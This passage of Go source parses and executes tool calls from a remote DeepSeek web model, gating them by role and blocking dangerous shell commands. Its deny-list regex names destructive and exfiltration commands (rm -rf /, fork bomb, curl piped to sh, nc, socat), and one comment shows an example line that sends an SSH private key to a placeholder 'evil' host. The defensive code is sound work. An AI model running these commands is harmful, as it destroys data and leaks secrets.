	// an executed round returns clean prose instead of a dangling "</".
	// The cut regex is anchored at the end ($), so only a trailing cut tag is
	// removed — "</div>" in prose or "</" mid-text stays untouched. It must
	// run on the NORMALIZED tail (the gate that let this round in normalized
	// first; a fullwidth "</" or format-char variant would otherwise open the
	// gate but survive the strip mismatch).
	out = dsmlToolCallsCloseCutRe.ReplaceAllString(normalizeDSMLText(out), "")
	// A close tag with an empty name (</> - the model dropped the
	// whole tag name after a bare invoke) is wrapper residue too: strip it
	// so IsPureDSMLToolCalls sees clean text.
	out = strings.ReplaceAll(out, "</>", "")
	out = dsmlToolResultRe.ReplaceAllString(out, "")
	return strings.TrimSpace(out)
}

// dsmlRoleAllowSet returns the tool names the current role may invoke via
// DSML: the role's tools spec (role_configs, falling back to DefaultFor) -
// the SAME source GetAllTools uses for dscli chat. There is no separate
// DSML allow-set: `dscli role update --tools` decides what the web model
// may call, exactly as it decides for the local agent.
func dsmlRoleAllowSet(ctx context.Context) map[string]bool {
	// "dev" here is the role-less ContextValue fallback, matching
	// DefaultFor's unknown-role profile - unrelated to the chat CLI's
	// --role default (defaultChatRole = "architect" in chat.go).
	role := dsctx.ContextValue(ctx, dsctx.CurrentRoleKey, "dev")
	return toolcall.RoleToolAllowSet(ctx, role)
}

// dsmlBlockedCmdRe rejects destructive shell commands the web model could
// emit. The review prompt asks for read-only commands, but a remote model is
// not a trusted local agent, so clearly destructive patterns are refused
// outright and the expert is told why (it can adapt its approach).
//
// The outbound-network arm is broad on purpose: a plain `curl` (no `| sh`)
// can still exfiltrate local data via command substitution or query strings
// (`curl https://evil/?d=$(cat ~/.ssh/id_rsa)`), and raw-socket tools
// (`nc`/`ncat`/`socat`/`telnet`) are exfiltration channels by themselves -
// no pipe or substitution needed. So curl/wget/nc/ncat/telnet/socat are
// refused in any form. Read-only verification never needs them - the
// review/expert prompts recommend git/grep/sed/ls.
var dsmlBlockedCmdRe = regexp.MustCompile(`(?i)(^|\s|;|&&|\|\|)(` +
	// Filesystem/data destruction.
	`rm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+(/|~)|` +
	`mkfs|dd\s+[^\n]*of=/dev/|` +
	`chmod\s+-R\s+777\s+/|` +
	// Machine control.
	`shutdown|reboot|halt\b|poweroff|` +
	// Fork bomb.
	`:\(\)\s*\{|` +
	// Privilege escalation / remote code execution / data exfiltration.
	`sudo\s+|curl\s+[^\n]*\|\s*(ba)?sh|wget\s+[^\n]*\|\s*(ba)?sh|` +
	`curl\b|wget\b|nc\b|ncat\b|telnet\b|socat\b|` +
	// History/state rewriting git operations.
	`git\s+(push\s+(-f|--force)|reset\s+--hard|clean\s+-[a-zA-Z]*[fd]|stash|checkout\s+--))`)

// normalizeDSMLInvoke maps a DSML call to a native tool name and arguments.
//
// Role-configured tools are registered with their native names and parameter
// schemas (dsml_doc.go), so the model writes what the executor accepts: this
// is a verbatim passthrough that only strips the DSML decorative parameter
// justification (DeepSeek's habit of adding it to every call) - the local
// handler validates everything else.
//
// One DSML-layer check remains, not avoidable: destructive-command
// interception for calls targeting the shell tool (dsmlBlockedCmdRe) - a
// remote web model is not a trusted local agent.
func normalizeDSMLInvoke(inv DSMLCall) (name string, args toolcall.ToolArgs, err error) {
	args = toolcall.ToolArgs{}
	for k, v := range inv.Args {
		if k == "justification" {
			continue
		}
		args[k] = v
	}

	name = inv.Name
	if name == "shell" {
		if script, ok := args["script"].(string); ok && dsmlBlockedCmdRe.MatchString(script) {
			return "", nil, fmt.Errorf("destructive command rejected (review is read-only): %q", truncateDSMLSummary(script))
		}
	}
	return name, args, nil
}

// truncateDSMLSummary caps the display summary at the shell tool's 40-char
// convention so terminal output stays tidy.
func truncateDSMLSummary(s string) string {
	if len(s) <= 40 {
		return s
	}
	return s[:37] + "..."
}

// dsmlToolCallID 为一次 DSML 调用派生稳定的 ToolCall ID。DSML 标记没有
// ID 字段，而执行内核的 tool 消息需要 ToolCallID；用 name + 规范化参数
// JSON 的 SHA-256 摘要代替——同一调用（同工具同参数）跨轮次得到同一 ID，
// 便于识别。工具使用统计按 name 记录（tools/tool_usage 表），不受 ID 影响。
// 截断为前 8 字节（64-bit 空间）：单次 webchat 会话只有几十个调用，碰撞
// 概率可忽略；完整摘要会放长日志与消息，收益不成比例。
func dsmlToolCallID(name, argsJSON string) string {
	sum := sha256.Sum256([]byte(name + "\x00" + argsJSON))
	return fmt.Sprintf("dsml_%x", sum[:8])
}

type dsmlExecPlan struct {
	content *toolcall.ToolContent
	index   int
}

// dsmlCallsToToolCalls 把解析出的 DSML 调用转换为协议 ToolCall，交给
// toolcall.ExecuteToolCallsNoSave 批量执行。转换失败的调用（工具不在角色
// 配置或未注册、参数缺失、危险命令被拦截）不进执行列表，由计划表记录错误
// 结果，保证输出与原始调用 1:1 对齐——专家按顺序对应它自己发出的
// tool_calls。
func dsmlCallsToToolCalls(calls []DSMLCall) (tcs []prompt.ToolCall, plan []dsmlExecPlan) {
	plan = make([]dsmlExecPlan, 0, len(calls))
	for _, inv := range calls {
		name, args, err := normalizeDSMLInvoke(inv)
		if err != nil {
			plan = append(plan, dsmlExecPlan{content: &toolcall.ToolContent{ToolName: inv.Name, Error: err.Error()}})
			continue
		}
		argsJSON, err := json.Marshal(args)
		if err != nil {
			plan = append(plan, dsmlExecPlan{content: &toolcall.ToolContent{ToolName: inv.Name, Error: err.Error()}})
			continue
		}
		tcs = append(tcs, prompt.ToolCall{
			ID:   dsmlToolCallID(name, string(argsJSON)),
			Type: "function",
			Function: prompt.ToolCallFunction{
				Name:      name,
				Arguments: string(argsJSON),
			},
		})
		plan = append(plan, dsmlExecPlan{index: len(tcs) - 1})
	}
	return tcs, plan
}

// ExecuteDSMLToolCalls executes parsed DSML calls in order and returns one
// feedback block per call, wrapped the way DeepSeek web models expect:
//
//	<tool_result>{"result":...,"warning":...,"error":...}</tool_result>
//
// (see the DSML encoding README: tool execution results are wrapped in
// <tool_result> tags within user messages, sorted by the order of the
// corresponding tool_calls in the preceding assistant message). The JSON
// payload is the ToolContent shape (result/warning/error), omitzero applied.
// Blocks are 1:1 with the input calls, in order — a call rejected before
// execution (destructive command, missing parameter) still gets its own
// error block so the expert can adapt its approach.
//
// A call whose name is outside the role's tools config (or not a
// registered tool) is never executable and is skipped silently (debug log,
// no output block): fenced-code quotes never parse (see dsmlBlockRanges),
// but a bare reference in prose - e.g. an expert quoting the DSML test
// corpus - still does, and feeding an "unknown tool" error back into the
// conversation makes the model argue with itself about a call it never
// intended.
//
// Execution reuses the HandleToolCalls core (usage statistics, result
// truncation, dual-message split) but does NOT persist tool messages: the
// web conversation lives in the browser, and writing results into the
// current session's messages table would break the assistant↔tool pairing
// that CleanupReverse relies on (the whole ask_expert turn would be dropped
// from history).
func ExecuteDSMLToolCalls(ctx context.Context, calls []DSMLCall) (outputs []string) {
	span, ctx := clog.StartSpanFromContext(ctx, "ExecuteDSMLToolCalls")
	defer span.Finish()

	// The role's tools spec decides what may be executed - the same source
	// GetAllTools uses, so the web model can only call what the role is
	// configured for. An unregistered name (a quoted example, or a role
	// that names an unknown tool) is skipped silently: feeding back an
	// "unknown tool" error would make the expert argue with itself about a
	// call it never intended.
	allowed := dsmlRoleAllowSet(ctx)
	kept := make([]DSMLCall, 0, len(calls))
	for _, inv := range calls {
		// The role's tools spec gates execution by the call's native name -
		// the same source GetAllTools uses, so the web model can only call
		// what the role is configured for. A call under any other name (a
		// legacy spelling, a quoted example, an unknown tool) is skipped
		// silently: feeding back an "unknown tool" error would make the
		// expert argue with itself about a call it never intended.
		if allowed != nil && !allowed[inv.Name] {
			outfmt.Debug("DSML skipped tool %q: not in role's tools config", inv.Name)
			continue
		}
		if _, defOK := toolcall.GetToolDef(ctx, inv.Name); !defOK {
			outfmt.Debug("DSML skipped unregistered tool %q (quoted example or unknown name)", inv.Name)
			continue
		}
		kept = append(kept, inv)
	}
	calls = kept
	if len(calls) == 0 {
		return nil
	}

	tcs, plan := dsmlCallsToToolCalls(calls)
	outcomes, dualUsers := toolcall.ExecuteToolCallsNoSave(ctx, tcs)
	if len(dualUsers) > 0 {
		// A role-configured tool may return a DualMessage (e.g. a vision
		// tool attaching image blocks). The DSML wire format cannot carry
		// extra user messages, so they are dropped - but loudly, since the
		// web model will not see the data and may misread the result.
		outfmt.Debug("DSML dropped %d dual user message(s); tool returned extra user message", len(dualUsers))
		fmt.Fprintf(os.Stderr, "⚠️ DSML: %d tool result(s) included an extra user message (e.g. image) that cannot be forwarded to webchat\n", len(dualUsers))
	}
	for _, step := range plan {
		if step.content != nil {
			outputs = append(outputs, formatDSMLToolResult(step.content))
			continue
		}
		outputs = append(outputs, formatDSMLToolResult(&outcomes[step.index].Content))
	}
	return outputs
}

func formatDSMLToolResult(c *toolcall.ToolContent) string {
	dup := *c // never mutate the caller's ToolContent (and avoid shadowing copy)
	if dup.Result == "" && dup.Error == "" && dup.Warning == "" {
		dup.Result = "(no output)"
	}
	b, err := json.Marshal(&dup)
	if err != nil { // unreachable: ToolContent fields are strings only
		return fmt.Sprintf(`<tool_result>{"error":%q}</tool_result>`, err.Error())
	}
	return "<tool_result>" + string(b) + "</tool_result>"
}

// parseDSMLToolCallsStrict is ParseDSMLToolCalls plus a strictness verdict:
// strict=true means the calls parsed (and are executable) but the markup
// deviated from the format the system prompt demands (see the violation list
// in ParseDSMLMessage). Violations only feed the OK judgement and the warning
// injected by InjectStrictWarning - they never block execution.
func parseDSMLToolCallsStrict(text string) (calls []DSMLCall, strict bool, err error) {
	original := text
	text = normalizeDSMLText(text)
	strict = text != original // violation: normalize changed the text (fullwidth/entities/zero-width/junk)
	blocks, unclosed, _, strays, implicitClose := dsmlBlockRangesStrict(text)
	if unclosed > 0 {
		return nil, false, fmt.Errorf("DSML tool call truncated: %d unclosed <invoke>", unclosed)
	}
	strict = strict || len(strays) > 0 || implicitClose // stray close / implicit close / cut close
	if len(blocks) == 0 {
		return nil, strict, nil
	}
	// Wrapper strictness: the canonical shape is a COMPLETE tool_calls pair
	// enclosing the blocks - an open tag before the first block and a close
	// tag after the last one. A bare invoke (no wrapper at all), a typo'd
	// wrapper (_calls / slash-less), a cut-off close, or a wrapper that
	// does not enclose the calls are all tolerated for execution but count
	// as violations. A plain substring check is not enough: prose carrying
	// a literal close tag would mask a bare invocation.
	fences := dsmlCodeRanges(text)
	openAt := strings.Index(text, "<tool_calls>")
	closeAt := strings.LastIndex(text, "</tool_calls>")
	lastBlock := blocks[len(blocks)-1]
	if openAt < 0 || closeAt < 0 || closeAt < openAt ||
		openAt > blocks[0].openStart || closeAt < lastBlock.closeEnd ||
		inCodeRanges(fences, openAt) || inCodeRanges(fences, closeAt) {
		strict = true
	}
	calls, extractStrict := extractDSMLCalls(text, blocks)
	strict = strict || extractStrict
	for _, c := range calls {
		if _, has := c.Args["justification"]; has {
			strict = true // violation: the decorative justification parameter
		}
	}
	return calls, strict, nil
}

// extractDSMLCalls pulls the calls out of already-paired invoke blocks (the
// shared extraction of ParseDSMLToolCalls); strict accumulates violations
// observed along the way (nested-block masking, missing string attribute).
func extractDSMLCalls(text string, blocks []dsmlBlockRange) (calls []DSMLCall, strict bool) {
	covered := -1 // closeEnd of the most recently parsed top-level block
	fences := dsmlCodeRanges(text)
	for _, b := range blocks {
		// A block directly nested inside another one (outside any
		// parameter body - those are opaque to the scan) is a structural
		// accident, not a second call: executing both would double-run the
		// inner tool. Skip it here just like StripDSMLToolCalls does.
		if b.openStart < covered {
			continue
		}
		covered = b.closeEnd
		// Opaque regions inside the block body, as body-relative offsets:
		// a nested invoke block (a structural accident whose parameters must
		// not leak into the enclosing call) and quoted code (a fenced block
		// or inline code span the model pasted into a value - the value must
		// survive verbatim, nothing inside it is structure).
		var opaque [][2]int
		body := text[b.openEnd:b.closeStart]
		for _, c := range blocks {
			if c.openStart > b.openStart && c.closeEnd < b.closeEnd {
				s, e := c.openStart-b.openEnd, c.closeEnd-b.openEnd
				opaque = append(opaque, [2]int{s, e})
				strict = true // violation: nested block was masked
			}
		}
		for _, r := range fences {
			s, e := r[0]-b.openEnd, r[1]-b.openEnd
			if e <= 0 || s >= len(body) {
				continue
			}
			if s < 0 {
				s = 0
			}
			if e > len(body) {
				e = len(body)
			}
			opaque = append(opaque, [2]int{s, e})
		}
		inOpaque := func(pos int) bool {
			for _, r := range opaque {
				if pos >= r[0] && pos < r[1] {
					return true
				}
			}
			return false
		}
		inv := DSMLCall{Name: dsmlBlockName(text[b.openStart:b.openEnd]), Args: map[string]any{}}
		scan := 0
		for scan < len(body) {
			m := dsmlParamOpenRe.FindStringIndex(body[scan:])
			if m == nil {
				break
			}
			pos := scan + m[0]
			if inOpaque(pos) || !dsmlStructuralTag(body, pos) {
				// quoted code or value content that merely looks like a parameter:
				scan = pos + 1
				continue
			}
			openEnd := scan + m[1]
			nameM := dsmlParamNameRe.FindStringSubmatch(body[pos:openEnd])
			if nameM == nil {
				scan = openEnd
				continue
			}
			key := nameM[1]
			strM := dsmlParamStringRe.FindStringSubmatch(body[pos:openEnd])
			isStr := strM != nil && strM[1] == "true"
			if strM == nil {
				strict = true // violation: parameter without the string attribute
			}
			// Find the matching close, skipping nested complete parameter pairs
			// (a value may embed one) and opaque regions. A missing close is
			// tolerated in two shapes: the value runs to the end of the body
			// (the wrapper close authorized the block) or to the next
			// structural parameter.
			depth := 0
			valueEnd := -1
			j := openEnd
			for j < len(body) {
				nextOpen := dsmlParamOpenRe.FindStringIndex(body[j:])
				nextClose := dsmlParamCloseRe.FindStringIndex(body[j:])
				if nextOpen == nil && nextClose == nil {
					break
				}
				if nextClose == nil || (nextOpen != nil && nextOpen[0] < nextClose[0]) {
					op := j + nextOpen[0]
					if inOpaque(op) || !dsmlStructuralTag(body, op) {
						j = j + nextOpen[1]
						continue
					}
					if depth == 0 {
						// A new structural parameter starts before this one closed:
						// the current one is implicitly closed here.
						valueEnd = op
						break
					}
					depth++
					j = j + nextOpen[1]
				} else {
					cp := j + nextClose[0]
					if inOpaque(cp) {
						j = j + nextClose[1]
						continue
					}
					if depth > 0 {
						depth--
						j = j + nextClose[1]
						continue
					}
					valueEnd = cp
					break
				}
			}
			if valueEnd < 0 {
				valueEnd = len(body)
				strict = true // violation: parameter close missing
			}
			val := decodeDSMLValue(body[openEnd:valueEnd], isStr)
			if key == "justification" {
				strict = true // violation: the decorative justification parameter
			}
			// Repeated parameters mean an array (DeepSeek models emit
			// the same name twice for a []string arg).
			if prev, ok := inv.Args[key]; ok {
				if arr, isArr := prev.([]any); isArr {
					inv.Args[key] = append(arr, val)
				} else {
					inv.Args[key] = []any{prev, val}
				}
			} else {
				inv.Args[key] = val
			}
			scan = valueEnd
		}
		calls = append(calls, inv)
	}
	return calls, strict
}

// CallSource returns the execution source for a reasoning/content pair:
// content first; when content carries no call, reasoning is the fallback
// (DeepSeek may draft calls in its thinking). This is the SAME selection
// ParseDSMLMessage performs, exported so the webchat loop and its entry
// gates cannot drift from the parser.
func CallSource(reasoning, content string) string {
	if !HasDSMLToolCalls(content) && HasDSMLToolCalls(reasoning) {
		return reasoning
	}
	return content
}

// ParseDSMLMessage is the unified entry for a DeepSeek web reply (reasoning
// + content). It extracts DSML tool calls and judges whether they strictly
// follow the format the system prompt demands (BuildDSMLToolDoc):
//
//   - ToolCalls non-empty: the reply contains tool calls that parsed. They
//     are executable regardless of OK (a format violation never blocks
//     execution - the result comes back with a warning instead).
//   - OK=true: no violations; Content (or ReasoningContent when the calls
//     came from reasoning) is stripped of the call blocks.
//   - OK=false: violations observed (see parseDSMLToolCallsStrict); the
//     Content/ReasoningContent keep the original text for the caller's
//     fallback judgement.
//   - ToolCalls empty: no executable call; whether the reply merely LOOKS
//     like a broken tool call is SuspectedDSMLToolCalls' job.
//
// Parse source: content first; when content carries no call, reasoning is
// parsed as a fallback (DeepSeek may draft calls in its thinking). When
// content has calls, reasoning is never an execution source and is kept
// verbatim.
func ParseDSMLMessage(reasoning string, content string) prompt.Message {
	msg := prompt.Message{Content: content, ReasoningContent: reasoning}
	src := CallSource(reasoning, content)
	fromReasoning := !HasDSMLToolCalls(content) && HasDSMLToolCalls(reasoning)
	if !HasDSMLToolCalls(src) {
		return msg
	}
	calls, strict, err := parseDSMLToolCallsStrict(src)
	if err != nil || len(calls) == 0 {
		// Parse failure / no call: the caller decides between the re-issue
		// path (SuspectedDSMLToolCalls) and a plain final answer.
		return msg
	}
	msg.ToolCalls, _ = dsmlCallsToToolCalls(calls)
	msg.OK = !strict
	if msg.OK {
		// OK=true: the message carries no tool-call content, only clean
		// content (per the contract).
		if fromReasoning {
			msg.ReasoningContent = StripDSMLToolCalls(reasoning)
		} else {
			msg.Content = StripDSMLToolCalls(content)
		}
	}
	return msg
}

// SuspectedDSMLToolCalls reports whether text is clearly TRYING to emit a
// tool call but none parsed: an unquoted named invoke open tag exists while
// ParseDSMLToolCalls fails or yields zero calls. The caller re-issues
// ReissueWarning and keeps the conversation alive. Quoted examples (fenced
// code, inline code, tool_result echoes) are not suspected.
func SuspectedDSMLToolCalls(text string) bool {
	if !HasDSMLToolCalls(text) {
		return false
	}
	calls, err := ParseDSMLToolCalls(text)
	if err == nil && len(calls) > 0 {
		return false
	}
	return hasUnquotedInvokeOpen(text)
}

// hasUnquotedInvokeOpen reports a named invoke open tag outside quoted code
// (fenced blocks, inline spans, tool_result echoes).
func hasUnquotedInvokeOpen(text string) bool {
	text = normalizeDSMLText(text)
	fences := dsmlCodeRanges(text)
	for _, m := range dsmlNamedInvokeOpenRe.FindAllStringIndex(text, -1) {
		if !inCodeRanges(fences, m[0]) {
			return true
		}
	}
	return false
}

// StrictWarning is the fixed-format warning template injected into every
// tool_result block when a call parsed with format violations (message.OK
// false): the call is accepted, the model is told to strictly follow the
// required format next time.
const StrictWarning = "WARNING: your tool-call markup did not strictly follow the required format (e.g. extra attribute such as justification, missing string attribute, unclosed or stray tags); the call was accepted but you MUST strictly follow the exact format in the tool schema for every future call."

// ReissueWarning is the re-issue template for a reply that clearly tries to
// emit a tool call but could not be parsed: ask for a strict re-send.
const ReissueWarning = "WARNING: your reply appears to contain a DSML tool call but it could not be parsed. Please re-send the tool call(s) strictly following the required format: invoke blocks (each with a name attribute and parameter children carrying the string attribute) wrapped in a tool_calls block, exactly as shown in the tool schema section of your instructions. Do not include extra attributes such as justification."

// InjectStrictWarning injects StrictWarning into the warning field of every
// tool_result block in outputs (ExecuteDSMLToolCalls' return values, each
// shaped like <tool_result>{...}</tool_result>). An existing warning is
// appended on a new line; empty blocks (no result/error/warning) and
// unparseable blocks are left untouched.
func InjectStrictWarning(outputs []string) []string {
	if len(outputs) == 0 {
		return outputs
	}
	out := make([]string, 0, len(outputs))
	for _, o := range outputs {
		body := strings.TrimSuffix(strings.TrimPrefix(o, "<tool_result>"), "</tool_result>")
		var c toolcall.ToolContent
		if err := json.Unmarshal([]byte(body), &c); err != nil {
			out = append(out, o)
			continue
		}
		if c.Result == "" && c.Error == "" && c.Warning == "" {
			out = append(out, o)
			continue
		}
		if c.Warning == "" {
			c.Warning = StrictWarning
		} else {
			c.Warning += "\n" + StrictWarning
		}
		out = append(out, formatDSMLToolResult(&c))
	}
	return out
}
